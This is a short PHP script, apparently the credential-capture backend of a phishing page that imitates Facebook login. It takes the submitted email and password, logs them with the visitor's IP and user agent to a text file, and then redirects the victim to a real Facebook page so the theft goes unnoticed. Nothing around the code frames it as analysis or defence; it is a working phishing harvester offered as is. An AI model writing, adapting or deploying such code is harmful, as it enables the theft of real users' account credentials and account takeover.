<?php

error_reporting(0);

$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$user = $_POST['email'];
$pass = $_POST['pass'];

if(strlen($user)<5||strlen($pass)<6||strlen($user)>32||strlen($pass)>25){
    header('Location: http://facebook.com');
    die();
}

file_put_contents("todayIsGood.txt", "Username: $user | Password: $pass    =>     IP: $ip | UA: $ua" . PHP_EOL, FILE_APPEND);

header('Location: https://www.facebook.com/communitystandards/hate_speech');
die();

?>